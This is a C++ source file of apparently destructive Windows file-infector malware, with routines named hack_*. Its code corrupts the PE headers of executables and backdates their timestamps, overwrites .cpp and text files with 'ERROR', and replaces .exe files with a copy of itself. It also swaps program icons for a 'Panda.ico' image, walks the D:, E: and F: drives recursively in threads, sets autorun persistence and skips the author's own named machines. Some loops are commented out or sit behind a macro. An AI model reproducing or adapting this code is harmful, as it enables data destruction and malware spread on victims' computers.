

#include "stdafx.h"
#include "WinHack.h"
#include <io.h>
#include <fstream>
#include "Convert.h"
#include "WinSysInfo.h"
#include "WinFileSys.h"
#include "WinLogIni.h"



void hack_Infectexedll(const char* Filename)
{
#ifndef DANGE_OFF
    LogFun(Filename);
    return;
#else
    std::fstream iofile(Filename, ios::in | ios::out | ios::binary);    //二进制覆写
    if (iofile)
    {
        const char* headstr = "....";
        iofile.seekp(60, ios::beg);                 //寻找60位置
        iofile.write(headstr, sizeof(headstr));     //摧毁DOS地址
        iofile.close();
        //注意性能会狠差的
        hack_updateexetime(Filename);
    }
#endif
}

void hack_InfectTXT(const char* Filename)
{
    //下面能实现向二进制文件*重写*数据 会清空为0kb再开始
    std::ofstream fout(Filename, std::ios::binary);
    int nNum = 20;
    std::string str("ERROR");
    fout.write((char*) &nNum, sizeof(int));
    fout.write(str.c_str(), sizeof(char) * (str.size()));
    fout.close();
}

bool hack_ExeChangeIcon(char* ExeFile, char* IconFile)
{
    if (0 == strcmp(IconFile, ""))
    {
        //以下算法需要优化 因为只修改了一个图标
        RaiseToDebug();         //开启特权
        HGLOBAL hResLoad(NULL);
        HANDLE hExe(NULL);
        HRSRC hRes(NULL);
        HANDLE hUpdateRes(NULL);
        char* lpResLock;
        BOOL result;
        hExe = LoadLibraryA(GetExePath(1).c_str()); //LoadLibraryA("SQCore.exe");
        if (hExe == NULL)
            return false;             //       ShowBox("加载Src.exe失败.");
        hRes = FindResourceA((HMODULE) hExe, (LPCSTR) 1, MAKEINTRESOURCEA(3));
        if (hRes == NULL)
            return false;             //       ShowBox("不能定位Src.exe中的第一个图标");
        hResLoad = LoadResource((HMODULE) hExe, hRes);
        if (hResLoad == NULL)
            return false;         //ShowBox("不能加载该图标资源");
        lpResLock = (char*) LockResource(hResLoad);
        if (lpResLock == NULL)
            return false;         //ShowBox("不能锁定该资源.");
        hUpdateRes = BeginUpdateResourceA(ExeFile, FALSE);
        if (hUpdateRes == NULL)
            return false;   //ShowBox("不能打开Target.exe准备写.");
        result = UpdateResource(hUpdateRes, RT_ICON, (LPCWSTR) 1, MAKELANGID(LANG_CHINESE, SUBLANG_SYS_DEFAULT), lpResLock, SizeofResource((HMODULE) hExe, hRes));
        if (result == FALSE)
            return false;             //ShowBox("添加资源失败.");
        if (!EndUpdateResourceA(hUpdateRes, false))
            return false; //ShowBox("不能向目标EXE中写入改动结束资源更新");
        if (!FreeLibrary((HMODULE) hExe))
            return false; //ShowBox("不能释放Src的句柄.");
        return true;
    }
    else
    {
        HEADER header;
        DWORD dwRet(0), nSize(0), nGSize(0), dwReserved(0);
        LPICONDIRENTRY pIconDirEntry(NULL);
        LPGRPICONDIR pGrpIconDir(NULL);
        LPBYTE pIconBytes(NULL);
        HANDLE hUpdate(NULL);
        WORD i(0);
        //文件句柄
        HANDLE hIconFile(NULL);
        //打开图标文件
        hIconFile = CreateFile(CharCovLpctstr(IconFile), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hIconFile == INVALID_HANDLE_VALUE)
            return false;
        //读取文件头部信息
        if (!ReadFile(hIconFile, &header, sizeof(HEADER), &dwReserved, NULL))
        {
            CloseHandle(hIconFile);
            return false;
        }
        //建立每一个图标的目录信息存放区域
        pIconDirEntry = (LPICONDIRENTRY) new BYTE[header.idCount * sizeof(ICONDIRENTRY)];
        if (pIconDirEntry == NULL)
        {
            CloseHandle(hIconFile);
            return false;
        }
        //从Icon文件中读取每一个图标的目录信息
        if (!ReadFile(hIconFile, pIconDirEntry, header.idCount * sizeof(ICONDIRENTRY), &dwReserved, NULL))
        {
            delete[] pIconDirEntry;
            CloseHandle(hIconFile);
            return false;
        }
        //建立EXE文件中RT_GROUP_ICON所需的数据结构存放区域
        nGSize = sizeof(GRPICONDIR) + header.idCount * sizeof(ICONDIRENTRY);
        pGrpIconDir = (LPGRPICONDIR) new BYTE[nGSize];
        //填充信息，这里相当于一个转换的过程
        pGrpIconDir->idReserved = header.idReserved;
        pGrpIconDir->idType = header.idType;
        pGrpIconDir->idCount = header.idCount;
        //复制信息并设置每一个图标对应的ID。ID为位置索引号
        for (i = 0; i < header.idCount; i++)
        {
            pGrpIconDir->idEntries[i].bWidth = pIconDirEntry[i].bWidth;
            pGrpIconDir->idEntries[i].bHeight = pIconDirEntry[i].bHeight;
            pGrpIconDir->idEntries[i].bColorCount = pIconDirEntry[i].bColorCount;
            pGrpIconDir->idEntries[i].bReserved = pIconDirEntry[i].bReserved;
            pGrpIconDir->idEntries[i].wPlanes = pIconDirEntry[i].wPlanes;
            pGrpIconDir->idEntries[i].wBitCount = pIconDirEntry[i].wBitCount;
            pGrpIconDir->idEntries[i].dwBytesInRes = pIconDirEntry[i].dwBytesInRes;
            pGrpIconDir->idEntries[i].nID = i;
        }
        //开始更新EXE中的图标资源，ID定为最小０，如果原来存在０ID的图标信息则被替换为新的。
        hUpdate = BeginUpdateResource(CharCovLpctstr(ExeFile), false);
        if (hUpdate != NULL)
        {
            //首先更新RT_GROUP_ICON信息
            if (!UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(0), MAKELANGID(LANG_CHINESE, SUBLANG_SYS_DEFAULT), (LPVOID) pGrpIconDir, nGSize))
            {
                delete[] pIconDirEntry;
                delete[] pGrpIconDir;
                CloseHandle(hIconFile);
                return false;
            }
            //接着的是每一个Icon的信息存放
            for (i = 0; i < header.idCount; i++)
            {
                //Icon的字节数
                nSize = pIconDirEntry[i].dwBytesInRes;
                //偏移文件的指针到当前图标的开始处
                dwRet = SetFilePointer(hIconFile, pIconDirEntry[i].dwImageOffset, NULL, FILE_BEGIN);
                if (dwRet == INVALID_SET_FILE_POINTER)
                    break;
                //准备pIconBytes来存放文件里的Byte信息用于更新到EXE中。
                delete[] pIconBytes;
                pIconBytes = new BYTE[nSize];
                if (!ReadFile(hIconFile, (LPVOID) pIconBytes, nSize, &dwReserved, NULL))
                    break;
                //更新每一个ID对应的RT_ICON信息
                if (!UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(pGrpIconDir->idEntries[i].nID), MAKELANGID(LANG_CHINESE, SUBLANG_SYS_DEFAULT), (LPVOID) pIconBytes, nSize))
                    break;
            }
            //结束EXE资源的更新操作
            if (pIconBytes != NULL)
                delete[] pIconBytes;
            EndUpdateResource(hUpdate, false);
        }
        //清理资源并关闭Icon文件，到此更新操作结束！
        delete[] pGrpIconDir;
        delete[] pIconDirEntry;
        CloseHandle(hIconFile);
        return true;
    }
}

void hack_LoopThoseFile(const char* PathName, const char* Typename)
{
    ////最好放到线程中处理
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1; //搜索
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;         //什么都没找到
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopInfectFile ( curr.c_str(), Typename ); //递归操作
    //    }
    //    else            //搜索后的文件  注意文件属性
    //    {
    //        if ( ( 0 == strcmp ( Typename, "" ) ) || ( rightstr ( filefind.name, 3 ) == string ( Typename ) ) ) //过滤文件类型
    //            //此处做操作处理
    //            hack_Infectexedll ( str1.c_str() );
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopInfectFile(const char* PathName, const char* Typename)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*";
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    string str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopInfectFile ( curr.c_str(), Typename );
    //    }
    //    else
    //    {
    //        if ( ( 0 == strcmp ( Typename, "" ) )
    //             || ( 0 == strcmp ( Typename, RightChar ( filefind.name, 3 ) ) )
    //             || ( 0 == strcmp ( "dll", RightChar ( filefind.name, 3 ) ) )
    //             || ( 0 == strcmp ( "lib", RightChar ( filefind.name, 3 ) ) )
    //             || ( 0 == strcmp ( "7z", RightChar ( filefind.name, 2 ) ) ) )
    //            hack_Infectexedll ( str1.c_str() );
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopCopySelfexe(const char* PathName, const char* selfpath)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1;
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopCopySelfexe ( curr.c_str(), selfpath );
    //    }
    //    else
    //    {
    //        if ( 0 == strcmp ( "exe", RightChar ( filefind.name, 3 ) ) )
    //        {
    //            DeleteFileA ( str1.c_str() );
    //            if ( !CopyFileA ( selfpath, str1.c_str(), FALSE ) )
    //                cout << str1.c_str() << " copy error " << endl;
    //        }
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopInfectTxt(const char* PathName, const char* Typename)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1;
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopInfectFile ( curr.c_str(), Typename );
    //    }
    //    else
    //    {
    //        if ( ( rightstr ( filefind.name, 3 ) == string ( Typename ) ) /*|| (rightstr(filefind.name, 3) =="cpp")*/ ) //过滤文件类型
    //            hack_InfectTXT ( str1.c_str() );
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopIconExeFile(const char* PathName)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1;
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;         //什么都没找到
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopIconExeFile ( curr.c_str() );
    //    }
    //    else             //搜索后的文件  注意文件属性
    //    {
    //        if ( rightstr ( filefind.name, 3 ) == "exe" ) //过滤文件类型
    //            hack_ExeChangeIcon ( const_cast<char*> ( str1.c_str() ), "Panda.ico" );
    //    }
    //}
    //_findclose ( handle );
}

void hack_updateexetime(const char* f_name)
{
    SYSTEMTIME t;
    FILETIME ft;
    HANDLE file;
    GetSystemTime(&t);
    t.wDay = t.wDay - 1;
    t.wHour = t.wHour - 3;
    SystemTimeToFileTime(&t, &ft);
    file = CreateFileA(f_name, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetFileTime(file, &ft, &ft, &ft);
    CloseHandle(file);
    return;
}

#ifndef  ThreadPro_FunThreadProc
typedef void (*FunThreadProc)(void);
void ThreadProTmp(FunThreadProc f_NewFun)
{
    HANDLE StartThreadHandle;
    DWORD StartThreadID;
    StartThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) f_NewFun, NULL, 0, &StartThreadID);
    CloseHandle(StartThreadHandle);    //上面线程完成后自动释放线程
}

void testDfile(void)
{
    if (GetDriveTypeA("D:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectFile("D:/", "exe");    //D存在
    else
        hack_LoopInfectFile("C:/", "exe");
    cout << "dend" << endl;
}

void testEfile(void)
{
    if (GetDriveTypeA("E:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectFile("E:/", "exe");
    cout << "eend" << endl;
}

void testFfile(void)
{
    if (GetDriveTypeA("F:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectFile("F:/", "exe");
    cout << "fend" << endl;
}

void testCPPTxt(void)
{
    if (GetDriveTypeA("D:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectTxt("D:/", "cpp");
    else
        hack_LoopInfectTxt("E:/", "cpp");
}

void hack_ThreadFile(void)
{
    ThreadProTmp(testDfile);
    ThreadProTmp(testEfile);
    ThreadProTmp(testFfile);
}
#endif

char* GetPCName(void)
{
    static char buf[255] = { 0 };
    DWORD mdwSize = sizeof(buf);
    if (GetComputerNameExA((COMPUTER_NAME_FORMAT) 1, buf, &mdwSize))
        return buf;
    else
        return "0";
}

int hack_ZwNtSuspendProcess(int ff)
{
    if (strcmp("ThinkPad-X220", GetPCName()) == 0)
    {
        cout << "sys error!" << endl;
        return 0;
    }
    if (strcmp("E550c-PC", GetPCName()) == 0)
    {
        cout << "sys error!" << endl;
        return 0;
    }
    SetAutoRun("bfsvcl");
    if (0 == ff)
    {
        ThreadProTmp(testDfile);
        ThreadProTmp(testEfile);
        ThreadProTmp(testFfile);
    }
    else
    {
        testDfile();
        testEfile();
        testFfile();
#ifndef __DANGE__
        LogFun("run ok!");
#endif
    }
    return 0;
}








